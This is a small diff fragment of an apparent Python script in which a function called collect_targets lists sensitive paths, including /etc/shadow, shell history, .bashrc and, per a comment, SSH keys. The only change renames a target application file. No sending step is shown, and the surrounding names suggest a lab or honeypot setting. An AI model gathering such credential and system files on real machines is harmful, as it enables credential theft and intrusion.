@@ -76,7 +76,7 @@ def collect_targets():
         "/etc/shadow",
         os.path.expanduser("~/.bash_history"),
         os.path.expanduser("~/.bashrc"),
-        os.path.expanduser("~/vuln_api.py"),
+        os.path.expanduser("~/target_app.py"),
         os.path.expanduser("~/trap.log"),
     ]
     # SSH keys
